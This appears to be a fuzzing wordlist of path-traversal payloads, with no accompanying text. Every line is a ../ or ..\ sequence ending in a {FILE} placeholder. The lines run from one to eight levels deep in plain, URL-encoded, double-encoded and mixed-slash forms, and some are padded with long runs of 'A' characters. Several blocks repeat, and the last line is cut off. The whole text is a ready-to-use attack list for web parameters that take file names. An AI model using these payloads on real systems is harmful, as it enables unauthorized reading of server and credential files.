    ..%2f..%2f{FILE}
    ..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
    %2e%2e/{FILE}
    %2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    ..%252f{FILE}
    ..%252f..%252f{FILE}
    ..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
    %252e%252e/{FILE}
    %252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    ..\{FILE}
    ..\..\{FILE}
    ..\..\..\{FILE}
    ..\..\..\..\{FILE}
    ..\..\..\..\..\{FILE}
    ..\..\..\..\..\..\{FILE}
    ..\..\..\..\..\..\..\{FILE}
    ..\..\..\..\..\..\..\..\{FILE}
    ..%5c{FILE}
    ..%5c..%5c{FILE}
    ..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
    %2e%2e\{FILE}
    %2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    ..%255c{FILE}
    ..%255c..%255c{FILE}
    ..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
    %252e%252e\{FILE}
    %252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    ../{FILE}
    ../../{FILE}
    ../../../{FILE}
    ../../../../{FILE}
    ../../../../../{FILE}
    ../../../../../../{FILE}
    ../../../../../../../{FILE}
    ../../../../../../../../{FILE}
    ..%2f{FILE}
    ..%2f..%2f{FILE}
    ..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
    %2e%2e/{FILE}
    %2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    ..%252f{FILE}
    ..%252f..%252f{FILE}
    ..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
    %252e%252e/{FILE}
    %252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    ..\{FILE}
    ..\..\{FILE}
    ..\..\..\{FILE}
    ..\..\..\..\{FILE}
    ..\..\..\..\..\{FILE}
    ..\..\..\..\..\..\{FILE}
    ..\..\..\..\..\..\..\{FILE}
    ..\..\..\..\..\..\..\..\{FILE}
    ..%5c{FILE}
    ..%5c..%5c{FILE}
    ..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
    %2e%2e\{FILE}
    %2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    ..%255c{FILE}
    ..%255c..%255c{FILE}
    ..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
    %252e%252e\{FILE}
    %252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    \../{FILE}
    \../\../{FILE}
    \../\../\../{FILE}
    \../\../\../\../{FILE}
    \../\../\../\../\../{FILE}
    \../\../\../\../\../\../{FILE}
    \../\../\../\../\../\../\../{FILE}
    \../\../\../\../\../\../\../\../{FILE}
    /..\{FILE}
    /..\/..\{FILE}
    /..\/..\/..\{FILE}
    /..\/..\/..\/..\{FILE}
    /..\/..\/..\/..\/..\{FILE}
    /..\/..\/..\/..\/..\/..\{FILE}
    /..\/..\/..\/..\/..\/..\/..\{FILE}
    /..\/..\/..\/..\/..\/..\/..\/..\{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../{FILE}
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA